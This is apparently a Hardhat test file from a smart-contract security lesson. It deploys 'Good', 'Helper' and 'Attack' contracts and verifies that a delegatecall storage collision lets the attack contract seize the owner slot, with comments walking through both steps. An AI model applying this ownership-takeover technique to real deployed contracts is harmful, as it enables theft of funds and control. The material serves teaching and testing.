const { expect } = require("chai")
const hre = require("hardhat")
const { getStorageAt } = require("@nomicfoundation/hardhat-network-helpers");

describe("Attack", function () {
  it("Should change the owner of the Good Contract", async function () {
    const helperContract = await hre.ethers.deployContract("Helper", [])
    await helperContract.waitForDeployment()

    const goodContract = await hre.ethers.deployContract("Good", [helperContract.target])
    await goodContract.waitForDeployment()

    const attackContract = await hre.ethers.deployContract("Attack", [goodContract.target])
    await attackContract.waitForDeployment()

    // Let's attack the Good Contract
    const txn = await attackContract.attack()
    await txn.wait()

    // With the first row of the attack function [good.setNum(uint256(uint160(address(this))))],
    // the attacker calls the setNum function inside Good Contract.
    // The Good contract, using the delegateCall, calls the setNum function inside the Helper Contract
    // passing the address of the Attacker as argument.
    // Now the helper address inside the Good Contract is equal to the Attacker address.
    let helperSlot = await getStorageAt(goodContract.target, 0)
    helperSlot = hre.ethers.AbiCoder.defaultAbiCoder().decode(["address"], helperSlot)[0]
    expect(helperSlot).to.equal(attackContract.target)

    // With the second row of the attack function [good.setNum(1)],
    // the attacker now calls the setNum function inside Good Contract
    // that points to the Attacker Contract instead of the Helper Contract.
    // And the setNum of the Attacker contract set the owner value as the attacker address.
    // Now the owner value of the Good contract is equal to the attacker address.
    let ownerSlot = await getStorageAt(goodContract.target, 1)
    ownerSlot = hre.ethers.AbiCoder.defaultAbiCoder().decode(["address"], ownerSlot)[0]
    expect(ownerSlot).to.equal(attackContract.target)
  })
})
